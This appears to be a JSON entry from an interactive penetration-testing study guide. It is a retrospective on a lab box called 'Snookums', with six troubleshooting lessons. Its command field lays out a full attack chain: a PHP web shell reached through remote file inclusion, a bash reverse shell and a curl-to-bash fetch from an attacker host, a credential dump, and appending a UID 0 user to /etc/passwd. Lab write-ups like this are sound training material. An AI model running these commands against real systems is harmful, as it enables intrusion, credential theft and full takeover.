@@ -1,0 +1,46 @@
+{
+  "id": "snookums_lessons",
+  "phase": "MINDSET",
+  "title": "Snookums Retrospective — Six Lessons from an RFI-to-Root (Two Paths)",
+  "body": "Snookums was a Linux web box with two routes to root: an unintended PwnKit shortcut and the intended creds-to-writable-passwd chain. The foothold was clean; the time sink was entirely self-inflicted on the reverse-shell port. Chain (intended): Simple PHP Photo Gallery v0.8 RFI (image.php?img=) -> reverse shell as apache -> read db.php for MySQL root creds -> dump users table -> double-base64-decode michael's password -> SSH as michael -> michael owns /etc/passwd -> append a UID 0 user -> su to root. Shortcut: pkexec was SUID, so PwnKit (CVE-2021-4034) gave instant root from the apache shell.\n\nLESSON 1 - The payload's port MUST match the live listener, every time. The single biggest time-sink here: the PHP reverse shell was hardcoded to one port while the listener was on another, and the port kept changing between attempts. The shell fired, tried to call back, and timed out - looking exactly like a broken shell. Before every trigger, confirm: does the port baked into my payload equal the port my nc is listening on RIGHT NOW? Don't ctrl-C and restart listeners on different ports mid-attempt.\n\nLESSON 2 - Prove egress with ICMP before blaming the network. The httpd_t SELinux context made it tempting to declare 'SELinux is blocking the reverse shell.' But a ping fired through the RCE returned replies - the box COULD reach us. That one test killed the SELinux theory, the VPN theory, and the 'reboot Kali' theory in one shot. When a shell won't connect: ping yourself through the RCE first. Replies = egress works = it's your payload/port, not the network.\n\nLESSON 3 - Read errors literally. The box printed 'SOC_ERROR: 110: Connection timed out' and Burp showed '400 Bad Request' on the raw bash one-liner. Both were telling the exact truth: 110 = the callback couldn't reach the listener (port), 400 = the unencoded >, &, spaces broke the HTTP request. The answers were on screen; the fix was reading them instead of guessing causes.\n\nLESSON 4 - URL-encode payloads or host them as a file. The inline bash reverse shell died at 400 Bad Request because >, &, and spaces are structural characters in a URL. Two fixes: URL-encode every special char (Ctrl+U in Burp), or curl a shell script from your server so the nasty characters live in the file, not the URL. The file method is almost always less fragile.\n\nLESSON 5 - Decode until it stops being encoded. The DB passwords looked like base64 - but decoding once produced MORE base64. Double-encoded. michael's decoded twice to HockSydneyCertify123. Don't stop at the first successful decode; if the output still looks encoded, keep going.\n\nLESSON 6 - Check file OWNERSHIP, not just the obvious privesc. ls -la /etc/passwd showed it owned by michael, not root (-rw-r--r-- michael root). A writable/owned /etc/passwd = append a UID 0 line and su to instant root - cleaner and more reliable than a kernel exploit. PwnKit also worked here, but the intended path was the passwd write. Always ls -la the sensitive files; ownership is a privesc signal people skip.",
+  "cmd": "# ── Snookums chain, reproducible ──\n# 1) RFI -> RCE (Simple PHP Photo Gallery v0.8). Host shell2.php = <?php system($_GET['cmd']); ?>\ncurl 'http://$ip/image.php?img=http://<KALI>/shell2.php&cmd=id'   # -> uid=48(apache)\n\n# 2) Reverse shell - PORT MUST MATCH LISTENER. Host the shell as a file (less fragile than inline):\n#    sh.sh:  bash -i >& /dev/tcp/<KALI>/443 0>&1\nnc -lvnp 443      # leave it up, do NOT change the port\ncurl 'http://$ip/image.php?img=http://<KALI>/shell2.php&cmd=curl%20<KALI>/sh.sh%7Cbash'\n\n# 2b) If it won't connect: prove egress first\ncurl 'http://$ip/image.php?img=http://<KALI>/shell2.php&cmd=ping%20-c%203%20<KALI>'   # tcpdump -i tun0 icmp\n\n# 3) Loot the app config for DB creds\ncat db.php    # DBUSER root / DBPASS ...\n\n# 4) MySQL -> dump users\nmysql -u root -h 127.0.0.1 -p\n#   use SimplePHPGal;   SHOW TABLES;   SELECT * FROM users;\n\n# 5) Double-base64 decode (decode, then decode the result again)\necho 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d | base64 -d   # -> HockSydneyCertify123\n\n# 6) SSH as the recovered user, check passwd ownership\nssh michael@$ip\nls -la /etc/passwd                          # -rw-r--r-- michael root  <- michael OWNS it\n\n# 7) Writable/owned /etc/passwd -> append a UID 0 user -> instant root\n#    openssl passwd -1 'pass'  to make the hash, OR use a known one\necho 'pwn:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu pwn                                       # -> root\n\n# ALT shortcut: pkexec was SUID -> PwnKit (CVE-2021-4034) for instant root from the apache shell.",
+  "warn": "The whole Snookums struggle was port misalignment masquerading as SELinux/VPN/Kali problems. Sequence to avoid it: (1) listener up on a fixed port, (2) payload hardcoded to that SAME port, (3) ping through the RCE to prove egress, (4) only then trigger. When a shell 'won't connect' but the box can ping you, it is almost never the network - it's the port or the encoding.",
+  "choices": [
+    {
+      "label": "Apply RFI/LFI -> RCE on a new box",
+      "next": "lfi"
+    },
+    {
+      "label": "Reverse shell won't connect — port/encoding debug",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Found DB/app creds — spray them everywhere",
+      "next": "cred_reuse"
+    },
+    {
+      "label": "Writable/owned /etc/passwd — UID 0 abuse",
+      "next": "passwd_shadow"
+    },
+    {
+      "label": "pkexec is SUID — try PwnKit",
+      "next": "pwnkit"
+    },
+    {
+      "label": "Full Linux post-exploit enum flow",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "Stuck mid-engagement — methodology reset",
+      "next": "mindset_stuck"
+    },
+    {
+      "label": "Back to lessons hub",
+      "next": "jump_lessons"
+    },
+    {
+      "label": "Back to start (new box)",
+      "next": "start"
+    }
+  ]
+}
